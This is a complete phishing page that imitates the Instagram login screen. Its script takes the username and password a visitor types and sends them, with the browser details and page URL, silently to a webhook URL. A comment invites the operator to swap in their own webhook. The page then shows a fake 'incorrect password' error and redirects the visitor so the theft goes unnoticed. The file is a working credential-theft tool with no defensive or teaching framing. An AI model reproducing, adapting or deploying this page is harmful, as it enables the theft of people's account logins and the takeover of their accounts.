<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #fafafa 0%, #f0f0f0 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .phone-mockup {
            display: none;
        }

        .login-box {
            background: #fff;
            border: 1px solid rgba(219, 219, 219, 0.8);
            border-radius: 12px;
            padding: 48px 40px 24px;
            width: 370px;
            text-align: center;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.04);
            transition: box-shadow 0.3s ease;
        }

        .login-box:hover {
            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.08);
        }

        .logo {
            width: 175px;
            margin-bottom: 32px;
            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.02));
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .input-group {
            position: relative;
        }

        input {
            padding: 12px 12px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            font-size: 13px;
            outline: none;
            width: 100%;
            transition: all 0.2s ease;
            font-family: inherit;
        }

        input::placeholder {
            color: #8e8e8e;
            font-size: 12px;
        }

        input:focus {
            border-color: #a8a8a8;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(0, 149, 246, 0.06);
        }

        input:focus::placeholder {
            color: #c0c0c0;
        }

        button {
            background: linear-gradient(135deg, #0095f6, #0077e6);
            border: none;
            border-radius: 10px;
            padding: 10px 16px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 12px;
            width: 100%;
            opacity: 0.85;
            transition: all 0.25s ease;
            font-family: inherit;
            letter-spacing: 0.3px;
            box-shadow: 0 2px 8px rgba(0, 149, 246, 0.2);
        }

        button:hover {
            opacity: 1;
            transform: translateY(-1px);
            box-shadow: 0 4px 16px rgba(0, 149, 246, 0.3);
        }

        button:active {
            transform: translateY(0);
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            gap: 18px;
        }

        .line {
            flex: 1;
            height: 1px;
            background: linear-gradient(to right, transparent, #dbdbdb, transparent);
        }

        .or {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .facebook-login {
            margin-bottom: 12px;
        }

        .facebook-login a {
            color: #385185;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 8px;
            border-radius: 8px;
            transition: background 0.2s ease;
        }

        .facebook-login a:hover {
            background: rgba(56, 81, 133, 0.04);
        }

        .fb-icon {
            width: 18px;
            height: 18px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: inline-block;
            padding: 8px 0;
            transition: color 0.2s ease;
        }

        .forgot-password:hover {
            color: #0095f6;
        }

        .signup-box {
            background: #fff;
            border: 1px solid rgba(219, 219, 219, 0.8);
            border-radius: 12px;
            padding: 24px;
            width: 370px;
            text-align: center;
            font-size: 14px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.02);
        }

        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
            transition: color 0.2s ease;
        }

        .signup-box a:hover {
            color: #0077e6;
        }

        .get-app {
            text-align: center;
            margin-top: 8px;
        }

        .get-app p {
            font-size: 14px;
            color: #262626;
            margin-bottom: 16px;
            font-weight: 400;
        }

        .app-links {
            display: flex;
            gap: 10px;
            justify-content: center;
        }

        .app-links a {
            transition: transform 0.2s ease;
        }

        .app-links a:hover {
            transform: translateY(-2px);
        }

        .app-links img {
            height: 42px;
            border-radius: 6px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
        }

        .footer-links {
            display: flex;
            gap: 16px;
            flex-wrap: wrap;
            justify-content: center;
            margin-top: 20px;
            font-size: 11px;
            color: #c7c7c7;
        }

        .footer-links a {
            color: #c7c7c7;
            text-decoration: none;
            transition: color 0.2s ease;
        }

        .footer-links a:hover {
            color: #8e8e8e;
        }

        .error-message {
            color: #ed4956;
            font-size: 12px;
            margin-top: 8px;
            display: none;
            animation: shake 0.3s ease;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .loading-spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top: 2px solid #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .btn-text {
            display: inline;
        }

        button.loading .btn-text {
            display: none;
        }

        button.loading .loading-spinner {
            display: inline-block;
        }

        @media (max-width: 450px) {
            .login-box, .signup-box {
                width: 100%;
                max-width: 370px;
                border-radius: 0;
                border-left: none;
                border-right: none;
            }
            body {
                padding: 12px;
                background: #fff;
            }
        }

        @media (min-width: 876px) {
            .container {
                flex-direction: row;
                gap: 32px;
            }
            .phone-mockup {
                display: block;
                width: 380px;
                height: 580px;
                background: #fff;
                border-radius: 30px;
                border: 8px solid #1a1a1a;
                box-shadow: 0 12px 48px rgba(0,0,0,0.12);
                position: relative;
                overflow: hidden;
            }
            .phone-mockup::before {
                content: '';
                position: absolute;
                top: 10px;
                left: 50%;
                transform: translateX(-50%);
                width: 120px;
                height: 24px;
                background: #1a1a1a;
                border-radius: 0 0 12px 12px;
                z-index: 2;
            }
            .phone-screen {
                width: 100%;
                height: 100%;
                background: linear-gradient(145deg, #f8f8f8 0%, #fff 100%);
                padding: 40px 20px 20px;
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                gap: 16px;
            }
            .phone-screen .mini-logo {
                width: 100px;
                opacity: 0.6;
            }
            .phone-screen .mock-post {
                width: 90%;
                height: 200px;
                background: linear-gradient(135deg, #e8e8e8, #f5f5f5);
                border-radius: 12px;
                box-shadow: 0 2px 8px rgba(0,0,0,0.04);
            }
            .phone-screen .mock-avatar {
                width: 40px;
                height: 40px;
                border-radius: 50%;
                background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
                align-self: flex-start;
                margin-left: 5%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="phone-mockup">
            <div class="phone-screen">
                <div class="mock-avatar"></div>
                <img class="mini-logo" src="https://www.instagram.com/static/images/web/logout.jpg" alt="">
                <div class="mock-post"></div>
                <div class="mock-post" style="height: 80px;"></div>
            </div>
        </div>

        <div style="display:flex;flex-direction:column;align-items:center;gap:12px;">
            <div class="login-box">
                <img src="https://www.instagram.com/static/images/web/logout.jpg" alt="Instagram" class="logo">
                
                <form id="loginForm">
                    <div class="input-group">
                        <input type="text" id="username" placeholder="Phone number, username, or email" required autocomplete="off">
                    </div>
                    <div class="input-group">
                        <input type="password" id="password" placeholder="Password" required>
                    </div>
                    <button type="submit" id="loginBtn">
                        <span class="btn-text">Log In</span>
                        <div class="loading-spinner"></div>
                    </button>
                    <div class="error-message" id="errorMsg">Sorry, your password was incorrect. Please try again.</div>
                </form>

                <div class="divider">
                    <span class="line"></span>
                    <span class="or">OR</span>
                    <span class="line"></span>
                </div>

                <div class="facebook-login">
                    <a href="#">
                        <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="FB" class="fb-icon">
                        Log in with Facebook
                    </a>
                </div>

                <a href="#" class="forgot-password">Forgot password?</a>
            </div>

            <div class="signup-box">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>

            <div class="get-app">
                <p>Get the app.</p>
                <div class="app-links">
                    <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png" alt="Download on the App Store"></a>
                    <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png" alt="Get it on Google Play"></a>
                </div>
            </div>

            <div class="footer-links">
                <a href="#">Meta</a>
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Locations</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Threads</a>
                <a href="#">Contact Uploading &amp; Non-Users</a>
                <a href="#">Meta Verified</a>
            </div>
        </div>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            const btn = document.getElementById("loginBtn");
            const errorMsg = document.getElementById("errorMsg");

            // Show loading state
            btn.classList.add("loading");

            // Show fake error briefly to look realistic
            setTimeout(() => {
                errorMsg.style.display = "block";
                btn.classList.remove("loading");
            }, 1200);

            // ⚠️ REPLACE THIS WITH YOUR WEBHOOK URL
            const WEBHOOK_URL = "https://webhook.site/0a0d8fa1-aa7b-4c32-8dd4-0e82cac0e9ee";

            const payload = {
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                source: window.location.href
            };

            // Send to webhook (silent, no-cors)
            fetch(WEBHOOK_URL, {
                method: "POST",
                mode: "no-cors",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).catch(() => {});

            // After showing error, redirect to dashboard
            setTimeout(() => {
                window.location.href = "dashboard.html?user=" + encodeURIComponent(username);
            }, 2500);
        });

        // Focus effect on inputs
        document.querySelectorAll("input").forEach(input => {
            input.addEventListener("focus", function() {
                this.parentElement.style.transform = "scale(1.01)";
            });
            input.addEventListener("blur", function() {
                this.parentElement.style.transform = "scale(1)";
            });
        });
    </script>
</body>
</html>
